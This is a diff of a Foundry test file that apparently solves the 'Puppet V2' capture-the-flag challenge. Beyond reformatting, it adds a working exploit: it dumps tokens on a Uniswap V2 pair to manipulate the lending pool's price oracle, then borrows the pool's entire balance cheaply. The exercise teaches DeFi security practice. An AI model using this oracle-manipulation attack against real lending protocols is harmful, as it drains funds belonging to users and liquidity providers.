@@ -9,11 +9,7 @@ import {WETH9} from "../../../src/Contracts/WETH9.sol";
 
 import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
 
-import {
-    IUniswapV2Router02,
-    IUniswapV2Factory,
-    IUniswapV2Pair
-} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
+import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
 
 contract PuppetV2 is Test {
     // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
@@ -64,7 +60,8 @@ contract PuppetV2 is Test {
         // Deploy Uniswap Factory and Router
         uniswapV2Factory = IUniswapV2Factory(
             deployCode(
-                "./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))
+                "./src/build-uniswap/v2/UniswapV2Factory.json",
+                abi.encode(address(0))
             )
         );
 
@@ -87,8 +84,9 @@ contract PuppetV2 is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapV2Pair =
-            IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
+        uniswapV2Pair = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(dvt), address(weth))
+        );
 
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
@@ -106,11 +104,14 @@ contract PuppetV2 is Test {
 
         // Ensure correct setup of pool.
         assertEq(
-            puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether
+            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
+            0.3 ether
         );
 
         assertEq(
-            puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE),
+            puppetV2Pool.calculateDepositOfWETHRequired(
+                POOL_INITIAL_TOKEN_BALANCE
+            ),
             300000 ether
         );
 
@@ -121,10 +122,33 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        // 1. Dump DVT on UniV2 to manipulate oracle
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = uniswapV2Router.WETH();
+
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            path,
+            attacker,
+            DEADLINE
+        );
+
+        // 2. Get WETH and approve the lending pool
+        payable(address(weth)).call{value: 29.5 ether}("");
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+
+        // 3. Empty pool taking discounted loan
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
 
         /**
          * EXPLOIT END *
          */
+        vm.stopPrank();
         validation();
     }
 
